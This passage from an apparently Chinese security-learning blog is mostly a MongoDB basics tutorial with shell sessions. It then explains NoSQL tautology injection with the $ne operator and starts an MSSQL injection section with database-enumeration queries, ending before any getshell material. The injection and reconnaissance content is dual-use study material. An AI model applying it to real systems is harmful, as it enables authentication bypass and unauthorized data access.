<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">helloworld<span class="operator">&gt;</span> use helloworld1</span><br><span class="line">switched <span class="keyword">to</span> db helloworld1</span><br><span class="line">helloworld1<span class="operator">&gt;</span> db.createCollection(&quot;user&quot;)</span><br><span class="line">&#123; ok: <span class="number">1</span> &#125;</span><br><span class="line">helloworld1<span class="operator">&gt;</span> db.adminCommand(&#123;</span><br><span class="line">... renameCollection:&quot;helloworld1.user&quot;,</span><br><span class="line">... <span class="keyword">to</span>:&quot;helloworld.user&quot;</span><br><span class="line">... &#125;);</span><br><span class="line">&#123; ok: <span class="number">1</span> &#125;</span><br><span class="line">helloworld1<span class="operator">&gt;</span> <span class="keyword">show</span> tables;</span><br><span class="line"></span><br><span class="line">helloworld1<span class="operator">&gt;</span> use helloworld</span><br><span class="line">switched <span class="keyword">to</span> db helloworld</span><br><span class="line">helloworld<span class="operator">&gt;</span> <span class="keyword">show</span> tables</span><br><span class="line"><span class="keyword">user</span></span><br><span class="line">users1</span><br></pre></td></tr></table></figure>

<p>需要注意的是，使用renameCollection命令需要具有对两边数据库都有操作权限，例如dbadmin</p>
<h3 id="删除集合"><a href="#删除集合" class="headerlink" title="删除集合"></a>删除集合</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">db</span>.collection.<span class="keyword">drop</span>()</span><br></pre></td></tr></table></figure>

<p>无参数</p>
<p>例如我们删除刚刚已存在的users1</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">helloworld<span class="operator">&gt;</span> db.users1.drop()</span><br><span class="line"><span class="literal">true</span></span><br><span class="line">helloworld<span class="operator">&gt;</span> <span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">user</span></span><br></pre></td></tr></table></figure>

<h2 id="3-操作文档"><a href="#3-操作文档" class="headerlink" title="3.操作文档"></a>3.操作文档</h2><h3 id="插入文档"><a href="#插入文档" class="headerlink" title="插入文档"></a>插入文档</h3><p>其实插入文档的方法有两种，一种是插入单个文档insertOne()，一种是插入多个文档insertMany()</p>
<h4 id="插入单个文档insertOne"><a href="#插入单个文档insertOne" class="headerlink" title="插入单个文档insertOne()"></a>插入单个文档insertOne()</h4><p>insertOne() 方法用于在集合中插入单个文档。</p>
<p>基础语法</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db<span class="selector-class">.collection</span><span class="selector-class">.insertOne</span>(document, options)</span><br></pre></td></tr></table></figure>

<ul>
<li>document：要插入的单个文档。</li>
<li>options（可选）：一个可选参数对象，可以包含 writeConcern 和 bypassDocumentValidation 等。</li>
</ul>
<p>举个例子，我们在数据库的集合中插入一个文档</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">helloworld<span class="operator">&gt;</span> db.user.insertOne(&#123;</span><br><span class="line">... name:&quot;wanth3f1ag&quot;,</span><br><span class="line">... age:<span class="number">20</span>,</span><br><span class="line">... city:&quot;Cheng Du&quot;</span><br><span class="line">... &#125;);</span><br><span class="line">&#123;</span><br><span class="line">  acknowledged: <span class="literal">true</span>,</span><br><span class="line">  insertedId: ObjectId(<span class="string">&#x27;682d99b59f4df71519c59f35&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们find查询文档</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">helloworld<span class="operator">&gt;</span> db.user.find()</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    _id: ObjectId(<span class="string">&#x27;682d99b59f4df71519c59f35&#x27;</span>),</span><br><span class="line">    name: <span class="string">&#x27;wanth3f1ag&#x27;</span>,</span><br><span class="line">    age: <span class="number">20</span>,</span><br><span class="line">    city: <span class="string">&#x27;Cheng Du&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>可以看到这里成功插入了一个文档</p>
<h4 id="插入多个文档insertMany"><a href="#插入多个文档insertMany" class="headerlink" title="插入多个文档insertMany()"></a>插入多个文档insertMany()</h4><p>语法</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db<span class="selector-class">.collection</span><span class="selector-class">.insertMany</span>(<span class="selector-attr">[documents]</span>, options)</span><br></pre></td></tr></table></figure>

<ul>
<li>documents：要插入的文档数组。</li>
<li>options（可选）：一个可选参数对象，可以包含 ordered、writeConcern 和 bypassDocumentValidation 等。</li>
</ul>
<p>这里和单个文档不同的是，这里的插入多个文档数组，最后用方括号包裹</p>
<p>测试一下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">helloworld<span class="operator">&gt;</span> db.createCollection(&quot;user2&quot;)</span><br><span class="line">&#123; ok: <span class="number">1</span> &#125;</span><br><span class="line">helloworld<span class="operator">&gt;</span> db.user2.insertMany([</span><br><span class="line">... &#123;name:&quot;wang&quot;,age: <span class="number">19</span>,city: &quot;Bei Jing&quot;&#125;,</span><br><span class="line">... &#123;name:&quot;zhang&quot;,age: <span class="number">21</span>,city:&quot;New York&quot;&#125;</span><br><span class="line">... ]);</span><br><span class="line">&#123;</span><br><span class="line">  acknowledged: <span class="literal">true</span>,</span><br><span class="line">  insertedIds: &#123;</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: ObjectId(<span class="string">&#x27;682d9abd9f4df71519c59f36&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: ObjectId(<span class="string">&#x27;682d9abd9f4df71519c59f37&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>find()查询一下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">helloworld<span class="operator">&gt;</span> db.user2.find()</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    _id: ObjectId(<span class="string">&#x27;682d9abd9f4df71519c59f36&#x27;</span>),</span><br><span class="line">    name: <span class="string">&#x27;wang&#x27;</span>,</span><br><span class="line">    age: <span class="number">19</span>,</span><br><span class="line">    city: <span class="string">&#x27;Bei Jing&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    _id: ObjectId(<span class="string">&#x27;682d9abd9f4df71519c59f37&#x27;</span>),</span><br><span class="line">    name: <span class="string">&#x27;zhang&#x27;</span>,</span><br><span class="line">    age: <span class="number">21</span>,</span><br><span class="line">    city: <span class="string">&#x27;New York&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>可以看到这里插入了两行文档数组</p>
<h3 id="更新文档"><a href="#更新文档" class="headerlink" title="更新文档"></a>更新文档</h3><p>常用的方法包括 **updateOne()、updateMany()、replaceOne() 和 findOneAndUpdate()**。</p>
<p>使用 <code>updateOne()</code> 或 <code>save()</code> 方法来更新集合中的文档</p>
<h4 id="updateOne-方法"><a href="#updateOne-方法" class="headerlink" title="updateOne()方法"></a><strong>updateOne()方法</strong></h4><p>updateOne() 方法用于更新匹配过滤器的单个文档。</p>
<p>基础语法</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.collection.updateOne(<span class="keyword">filter</span>, <span class="keyword">update</span>, <span class="keyword">options</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>filter</strong>：用于查找文档的查询条件。</li>
<li><strong>update</strong>：指定更新操作的文档或更新操作符。</li>
<li><strong>options</strong>：可选参数对象，如 <code>upsert</code>、<code>arrayFilters</code> 等。</li>
</ul>
<p>那我们用这个方法将age年龄从19更新到30</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">helloworld<span class="operator">&gt;</span> db.user.updateOne(&#123;</span><br><span class="line">... name:&quot;wanth3f1ag&quot;&#125;,</span><br><span class="line">... &#123;$<span class="keyword">set</span>:&#123;age:<span class="number">30</span>&#125;&#125;</span><br><span class="line">... );</span><br><span class="line">&#123;</span><br><span class="line">  acknowledged: <span class="literal">true</span>,</span><br><span class="line">  insertedId: <span class="keyword">null</span>,</span><br><span class="line">  matchedCount: <span class="number">1</span>,</span><br><span class="line">  modifiedCount: <span class="number">1</span>,</span><br><span class="line">  upsertedCount: <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们查询一下文档是否更新</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">helloworld<span class="operator">&gt;</span> db.user.find()</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    _id: ObjectId(<span class="string">&#x27;682d99b59f4df71519c59f35&#x27;</span>),</span><br><span class="line">    name: <span class="string">&#x27;wanth3f1ag&#x27;</span>,</span><br><span class="line">    age: <span class="number">30</span>,</span><br><span class="line">    city: <span class="string">&#x27;Cheng Du&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h4 id="updateMany-方法"><a href="#updateMany-方法" class="headerlink" title="updateMany()方法"></a>updateMany()方法</h4><p>updateMany() 方法用于更新所有匹配过滤器的文档。</p>
<p>语法</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.collection.updateMany(<span class="keyword">filter</span>, <span class="keyword">update</span>, <span class="keyword">options</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>filter</strong>：用于查找文档的查询条件。</li>
<li><strong>update</strong>：指定更新操作的文档或更新操作符。</li>
<li><strong>options</strong>：可选参数对象，如 <code>upsert</code>、<code>arrayFilters</code> 等。</li>
</ul>
<h4 id="replaceOne-方法"><a href="#replaceOne-方法" class="headerlink" title="replaceOne()方法"></a>replaceOne()方法</h4><p>也是更新单个文档的</p>
<p>语法</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db<span class="selector-class">.collection</span><span class="selector-class">.replaceOne</span>(<span class="attribute">filter</span>, replacement, options)</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>filter</strong>：用于查找文档的查询条件。</li>
<li><strong>replacement</strong>：新的文档，将替换旧的文档。</li>
<li><strong>options</strong>：可选参数对象，如 <code>upsert</code> 等。</li>
</ul>
<h3 id="删除文档"><a href="#删除文档" class="headerlink" title="删除文档"></a>删除文档</h3><p>常用的删除文档方法包括 deleteOne()、deleteMany() 以及 findOneAndDelete()。</p>
<p>语法</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db<span class="selector-class">.collection</span><span class="selector-class">.deleteOne</span>(<span class="attribute">filter</span>, options)</span><br><span class="line">db<span class="selector-class">.collection</span><span class="selector-class">.deleteMany</span>(<span class="attribute">filter</span>, options)</span><br></pre></td></tr></table></figure>

<h3 id="查询文档"><a href="#查询文档" class="headerlink" title="查询文档"></a>查询文档</h3><p>MongoDB 查询文档使用 <strong>find()<strong>、</strong>findOne()</strong> 方法。</p>
<h4 id="find-方法"><a href="#find-方法" class="headerlink" title="**find()**方法"></a>**find()**方法</h4><p>语法</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.collection.<span class="built_in">find</span>(query, projection)</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>query</strong>：用于查找文档的查询条件。默认为 <code>&#123;&#125;</code>，即匹配所有文档。</li>
<li><strong>projection</strong>（可选）：指定返回结果中包含或排除的字段。</li>
</ul>
<h4 id="findOne-方法"><a href="#findOne-方法" class="headerlink" title="findOne()方法"></a>findOne()方法</h4><p>语法</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">db</span>.collection.findOne(<span class="keyword">query</span>, projection)</span><br></pre></td></tr></table></figure>

<p>如果找到多个匹配的文档，它只返回第一个。</p>
<ul>
<li><strong>query</strong>：用于查找文档的查询条件。默认为 <code>&#123;&#125;</code>，即匹配所有文档。</li>
<li><strong>projection</strong>（可选）：指定返回结果中包含或排除的字段。</li>
</ul>
<h2 id="4-关于操作符"><a href="#4-关于操作符" class="headerlink" title="4.关于操作符"></a>4.关于操作符</h2><h3 id="比较操作符"><a href="#比较操作符" class="headerlink" title="比较操作符"></a>比较操作符</h3><p>MongoDB 支持多种比较操作符，如 <strong>$gt(大于)、$lt(小于)、$gte(大于等于)、$lte(小于等于)、$eq(等于)、$ne(不等于)</strong> 等。</p>
<table>
<thead>
<tr>
<th align="left">操作符</th>
<th align="left">描述</th>
<th align="left">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>$eq</code></td>
<td align="left">等于</td>
<td align="left"><code>&#123; age: &#123; $eq: 25 &#125; &#125;</code></td>
</tr>
<tr>
<td align="left"><code>$ne</code></td>
<td align="left">不等于</td>
<td align="left"><code>&#123; age: &#123; $ne: 25 &#125; &#125;</code></td>
</tr>
<tr>
<td align="left"><code>$gt</code></td>
<td align="left">大于</td>
<td align="left"><code>&#123; age: &#123; $gt: 25 &#125; &#125;</code></td>
</tr>
<tr>
<td align="left"><code>$gte</code></td>
<td align="left">大于等于</td>
<td align="left"><code>&#123; age: &#123; $gte: 25 &#125; &#125;</code></td>
</tr>
<tr>
<td align="left"><code>$lt</code></td>
<td align="left">小于</td>
<td align="left"><code>&#123; age: &#123; $lt: 25 &#125; &#125;</code></td>
</tr>
<tr>
<td align="left"><code>$lte</code></td>
<td align="left">小于等于</td>
<td align="left"><code>&#123; age: &#123; $lte: 25 &#125; &#125;</code></td>
</tr>
<tr>
<td align="left"><code>$in</code></td>
<td align="left">在指定的数组中</td>
<td align="left"><code>&#123; age: &#123; $in: [25, 30, 35] &#125; &#125;</code></td>
</tr>
<tr>
<td align="left"><code>$nin</code></td>
<td align="left">不在指定的数组中</td>
<td align="left"><code>&#123; age: &#123; $nin: [25, 30, 35] &#125; &#125;</code></td>
</tr>
</tbody></table>
<p>语法</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; field: &#123; 比较操作符 : value &#125; &#125;</span><br></pre></td></tr></table></figure>

<p>例如我们查找年龄大于等于20的文档</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">helloworld<span class="operator">&gt;</span> db.user2.find()</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    _id: ObjectId(<span class="string">&#x27;682d9abd9f4df71519c59f36&#x27;</span>),</span><br><span class="line">    name: <span class="string">&#x27;wang&#x27;</span>,</span><br><span class="line">    age: <span class="number">19</span>,</span><br><span class="line">    city: <span class="string">&#x27;Bei Jing&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    _id: ObjectId(<span class="string">&#x27;682d9abd9f4df71519c59f37&#x27;</span>),</span><br><span class="line">    name: <span class="string">&#x27;zhang&#x27;</span>,</span><br><span class="line">    age: <span class="number">21</span>,</span><br><span class="line">    city: <span class="string">&#x27;New York&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line">helloworld<span class="operator">&gt;</span> db.user2.find(&#123;age:&#123;$gte:<span class="number">20</span>&#125;&#125;)</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    _id: ObjectId(<span class="string">&#x27;682d9abd9f4df71519c59f37&#x27;</span>),</span><br><span class="line">    name: <span class="string">&#x27;zhang&#x27;</span>,</span><br><span class="line">    age: <span class="number">21</span>,</span><br><span class="line">    city: <span class="string">&#x27;New York&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h3 id="逻辑操作符"><a href="#逻辑操作符" class="headerlink" title="逻辑操作符"></a>逻辑操作符</h3><p><strong>$and、$or、$not、$nor</strong>等逻辑操作符</p>
<table>
<thead>
<tr>
<th align="left">操作符</th>
<th align="left">描述</th>
<th align="left">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>$and</code></td>
<td align="left">逻辑与，符合所有条件</td>
<td align="left"><code>&#123; $and: [ &#123; age: &#123; $gt: 25 &#125; &#125;, &#123; city: &quot;New York&quot; &#125; ] &#125;</code></td>
</tr>
<tr>
<td align="left"><code>$or</code></td>
<td align="left">逻辑或，符合任意条件</td>
<td align="left"><code>&#123; $or: [ &#123; age: &#123; $lt: 25 &#125; &#125;, &#123; city: &quot;New York&quot; &#125; ] &#125;</code></td>
</tr>
<tr>
<td align="left"><code>$not</code></td>
<td align="left">取反，不符合条件</td>
<td align="left"><code>&#123; age: &#123; $not: &#123; $gt: 25 &#125; &#125; &#125;</code></td>
</tr>
<tr>
<td align="left"><code>$nor</code></td>
<td align="left">逻辑或非，均不符合条件</td>
<td align="left"><code>&#123; $nor: [ &#123; age: &#123; $gt: 25 &#125; &#125;, &#123; city: &quot;New York&quot; &#125; ] &#125;</code></td>
</tr>
</tbody></table>
<p>语法</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="variable">$and</span><span class="regexp">/nor/</span>or: [ &#123; condition1 &#125;, &#123; condition2 &#125; ] &#125;</span><br></pre></td></tr></table></figure>

<p>例如我们需要查找年龄大于10或者城市为纽约的</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">helloworld<span class="operator">&gt;</span> db.user2.find(&#123; $<span class="keyword">or</span>: [ &#123; age: &#123; $gte: <span class="number">10</span> &#125; &#125;, &#123; city: &quot;New York&quot; &#125;] &#125;)</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    _id: ObjectId(<span class="string">&#x27;682d9abd9f4df71519c59f36&#x27;</span>),</span><br><span class="line">    name: <span class="string">&#x27;wang&#x27;</span>,</span><br><span class="line">    age: <span class="number">19</span>,</span><br><span class="line">    city: <span class="string">&#x27;Bei Jing&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    _id: ObjectId(<span class="string">&#x27;682d9abd9f4df71519c59f37&#x27;</span>),</span><br><span class="line">    name: <span class="string">&#x27;zhang&#x27;</span>,</span><br><span class="line">    age: <span class="number">21</span>,</span><br><span class="line">    city: <span class="string">&#x27;New York&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>MongoDB 使用 <strong>$regex</strong> 操作符来设置匹配字符串的正则表达式。</p>
<table>
<thead>
<tr>
<th><code>$regex</code></th>
<th>匹配正则表达式</th>
<th><code>&#123; name: &#123; $regex: /^A/ &#125; &#125;</code></th>
</tr>
</thead>
</table>
<p>正则表达式符号</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>.</code></td>
<td>匹配任意单个字符（除换行符外）。</td>
</tr>
<tr>
<td><code>^</code></td>
<td>匹配字符串的开头。</td>
</tr>
<tr>
<td><code>$</code></td>
<td>匹配字符串的结尾。</td>
</tr>
<tr>
<td><code>*</code></td>
<td>匹配前面的字符零次或多次。</td>
</tr>
<tr>
<td><code>+</code></td>
<td>匹配前面的字符一次或多次。</td>
</tr>
<tr>
<td><code>?</code></td>
<td>匹配前面的字符零次或一次。</td>
</tr>
<tr>
<td><code>&#123;n&#125;</code></td>
<td>匹配前面的字符恰好 <code>n</code> 次。</td>
</tr>
<tr>
<td><code>&#123;n,&#125;</code></td>
<td>匹配前面的字符至少 <code>n</code> 次。</td>
</tr>
<tr>
<td><code>&#123;n,m&#125;</code></td>
<td>匹配前面的字符至少 <code>n</code> 次，最多 <code>m</code> 次。</td>
</tr>
<tr>
<td><code>[abc]</code></td>
<td>匹配字符集合中的任意一个字符（如 <code>a</code>、<code>b</code> 或 <code>c</code>）。</td>
</tr>
<tr>
<td><code>[^abc]</code></td>
<td>匹配不在字符集合中的任意一个字符。</td>
</tr>
<tr>
<td><code>\d</code></td>
<td>匹配任意数字字符（等价于 <code>[0-9]</code>）。</td>
</tr>
<tr>
<td><code>\D</code></td>
<td>匹配任意非数字字符。</td>
</tr>
<tr>
<td><code>\w</code></td>
<td>匹配任意字母、数字或下划线字符（等价于 <code>[a-zA-Z0-9_]</code>）。</td>
</tr>
<tr>
<td><code>\W</code></td>
<td>匹配任意非字母、数字或下划线字符。</td>
</tr>
<tr>
<td><code>\s</code></td>
<td>匹配任意空白字符（包括空格、制表符、换行符等）。</td>
</tr>
<tr>
<td><code>\S</code></td>
<td>匹配任意非空白字符。</td>
</tr>
<tr>
<td><code>(abc)</code></td>
<td>捕获组，匹配 <code>abc</code> 并将其保存为子匹配项。</td>
</tr>
<tr>
<td>&#96;</td>
<td>&#96;</td>
</tr>
</tbody></table>
<h2 id="Nosql注入"><a href="#Nosql注入" class="headerlink" title="Nosql注入"></a>Nosql注入</h2><p>和传统的mysql不一样，nosql的查询语法是基于应用程序的编程语言去决定的，例如PHP，Java，Python等，所以这也意味着存在nosql注入的时候我们不仅可以在数据库中执行命令，也可以在应用程序中执行命令</p>
<h3 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h3><h4 id="1-重言式注入"><a href="#1-重言式注入" class="headerlink" title="1.重言式注入"></a>1.重言式注入</h4><ul>
<li><strong>重言式注入</strong>又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。</li>
</ul>
<p>这个的话往往需要结合操作符去进行注入，例如在这些操作符中，**$ne**就是我们在重言式注入中需要利用到的那个。它的作用是将不等于指定值的数据都查询出来。比如$ne&#x3D;1时就是将所有不等于1的数据都查询出来。</p>
<h1 id="mssql注入"><a href="#mssql注入" class="headerlink" title="mssql注入"></a>mssql注入</h1><p>借鉴师傅的文章:<a target="_blank" rel="noopener" href="https://y4er.com/posts/mssql-injection-learn/#%E7%AC%A6%E5%8F%B7,https://y4er.com/posts/mssql-getshell/">https://y4er.com/posts/mssql-injection-learn/#%E7%AC%A6%E5%8F%B7,https://y4er.com/posts/mssql-getshell/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/193819.html">https://www.secpulse.com/archives/193819.html</a></p>
<p>什么是mssql？</p>
<p>MSSQL，或称为Microsoft SQL Server，mssql是Microsoft System Structured Query Language 的缩写，是指微软操作系统的数据库语言，是由微软开发的一种数据库关系管理系统（RDBMS）。</p>
<h3 id="MSSQL基础使用"><a href="#MSSQL基础使用" class="headerlink" title="MSSQL基础使用"></a>MSSQL基础使用</h3><p>讲到mssql数据库，我们首先要了解到里面的自带库</p>
<p>默认自带库的类型</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">master   <span class="comment">//用于记录所有SQL Server系统级别的信息，这些信息用于控制用户数据库和数据操作。</span></span><br><span class="line"><span class="keyword">model</span>    <span class="comment">//SQL Server为用户数据库提供的样板，新的用户数据库都以model数据库为基础</span></span><br><span class="line">msdb     <span class="comment">//由 Enterprise Manager和Agent使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息。</span></span><br><span class="line">tempdb   <span class="comment">//它为临时表和其他临时工作提供了一个存储区。</span></span><br></pre></td></tr></table></figure>

<p>其中最常用的就是master库了</p>
<h4 id="master库"><a href="#master库" class="headerlink" title="master库"></a>master库</h4><p>master数据库是系统数据库，这里存储了所有数据库名和存储过程，就好比mysql里面的information_schema元数据库，这个存储过程其实就好比是一个函数调用的过程</p>
<p>储存过程是一个可编程的函数，它在数据库中创建并保存。它可以有SQL语句和一些特殊的控制结构组成。当希望在不同的应用程序或平台上执行相同的函数，或者封装特定功能时，存储过程是非常有用的。数据库中的存储过程可以看做是对编程中面向对象方法的模拟。它允许控制数据的访问方式。(不是注入的重点，主要是后面getshell需要用，所以简单了解一下就可以了，下面还会带到)</p>
<p>这里贴一张关于master库的展示图</p>
<p><img src="/./../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/1.1.1.png" alt="1.1.1"></p>
<p>在master数据库中有<code>master.dbo.sysdatabases</code>视图，储存所有数据库名,其他数据库的视图则储存他本库的表名与列名。 每一个库的视图表都有<code>syscolumns</code>存储着所有的字段，可编程性储存着我们的函数。</p>
<p>查询数据库语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select name from master.dbo.sysdatabases;</span><br><span class="line">#在 SQL Server 中，查询master.dbo.sysdatabases视图可以用于获取实例数据库中所有数据库的名称。</span><br><span class="line">master</span><br><span class="line">tempdb</span><br><span class="line">model</span><br><span class="line">msdb</span><br><span class="line">test</span><br><span class="line">asp_net</span><br><span class="line">asp_test</span><br></pre></td></tr></table></figure>

<p>关于字段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select top 1 name,xtype from sysobjects;</span><br><span class="line">#这是一个 SELECT 查询语句，它从 sysobjects 表中选择顶部 1 条记录，并仅检索 name 和 xtype 列的值。</span><br></pre></td></tr></table></figure>

<p>但是这里的xtype是可控的，可以是下面这些类型的一种</p>
<ul>
<li>C &#x3D; CHECK 约束</li>
<li>D &#x3D; 默认值或 DEFAULT 约束</li>
<li>F &#x3D; FOREIGN KEY 约束</li>
<li>L &#x3D; 日志</li>
<li>FN &#x3D; 标量函数</li>
<li>IF &#x3D; 内嵌表函数</li>
<li>P &#x3D; 存储过程</li>
<li>PK &#x3D; PRIMARY KEY 约束（类型是 K）</li>
<li>RF &#x3D; 复制筛选存储过程</li>
<li>S &#x3D; 系统表</li>
<li>TF &#x3D; 表函数</li>
<li>TR &#x3D; 触发器</li>
<li>U &#x3D; 用户表</li>
<li>UQ &#x3D; UNIQUE 约束（类型是 K）</li>
<li>V &#x3D; 视图</li>
<li>X &#x3D; 扩展存储过程</li>
</ul>
<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>我们先了解一下服务器级别和数据库级别的角色的区别</p>
<ol>
<li>服务器级别角色：<ul>
<li>服务器级别角色是定义在整个 SQL Server 实例上的一组固定角色。</li>
